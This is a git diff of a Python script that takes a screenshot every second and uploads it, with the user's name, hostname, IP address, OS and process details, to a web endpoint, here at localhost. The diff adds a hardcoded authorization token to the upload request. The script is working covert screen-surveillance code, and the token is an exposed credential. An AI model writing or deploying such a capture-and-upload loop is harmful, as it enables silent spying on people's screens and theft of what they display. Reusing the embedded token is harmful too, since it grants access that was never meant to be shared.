@@ -1,4 +1,4 @@
-import time,datetime,schedule,os,platform,socket,requests,logging,json,subprocess
+import datetime,schedule,os,platform,socket,requests,logging,json,subprocess
 from PIL import ImageGrab
 
 
@@ -17,15 +17,14 @@ def screen():
     image1 = os.path.join(path,'%s.jpg'%str(c))
     im.save(image1)
     im.close()
-    #print(im.size)
     created_time = datetime.datetime.fromtimestamp(os.stat(image1).st_ctime)
-    #print(str(created_time))
     data1 = {'enctype': 'multipart/form-data', 'os': host_info, 'host_name': host_name, 'user': host_user,
-             'ip': host_ip,'created_at':created_time,'length':(im.size)[0],'width':(im.size)[-1],'file_size':os.stat(image1).st_size}
+             'ip': host_ip,'created_at':created_time,'length':(im.size)[0],'pid':file_pid,
+             'width':(im.size)[-1],'file_size':os.stat(image1).st_size,'file_abs_path':file_abs_path,'file_name':file_name}
     f =  open(image1, 'rb')
     file1 = {'file': f}
     try:
-        res = requests.post(update_url, data=data1, files=file1)
+        res = requests.post(update_url,headers={"Authorization":"token 4616eac1a3e2419d53d0fdb870850a83d36f3bf3"}, data=data1, files=file1)
         if res.status_code == 200:
               #print(res.text)
               info = json.loads(res.text)
@@ -41,27 +40,31 @@ logging.basicConfig(level=logging.DEBUG,
                     datefmt='%a, %d %b %Y %H:%M:%S',
                     filename='app.log',
                     filemode='a+')
-try:
-    c=0
-    path = 'D:\\listen\\images\\'
-    if os.path.isdir(path) is False:
-        os.system('mkdir %s'%path)
-    update_url = 'http://127.0.0.1:8000/api/upload_images/'
-    host_user = os.getenv('username')
-    host_name = socket.gethostname()
-    host_address = socket.gethostbyname('demonlg')
-    host_info = platform.system()
-    host_ip = socket.gethostbyname('demonlg')
 
+file_pid = os.getpid()
+file_abs_path = os.path.abspath(__file__)
+file_name = os.path.basename(file_abs_path)
+c=0
+path = r'D:\listen\images'
+if os.path.isdir(path) is False:
+    os.system('mkdir %s'%path)
+update_url = 'http://127.0.0.1:8000/api/upload_images/'
+host_user = os.getenv('username')
+host_name = socket.gethostname()
+host_address = socket.gethostbyname('demonlg')
+host_info = platform.system()
+host_ip = socket.gethostbyname('demonlg')
 
+if __name__ == '__main__':
 
-    schedule.every(1).seconds.do(screen)
-    while True:
-        schedule.run_pending()
-        c +=1
-except Exception as e:
-    logging.error(e)
-    pass
+    try:
+        schedule.every(1).seconds.do(screen)
+        while True:
+            schedule.run_pending()
+            c +=1
+    except Exception as e:
+        logging.error(e)
+        pass
 
 
 
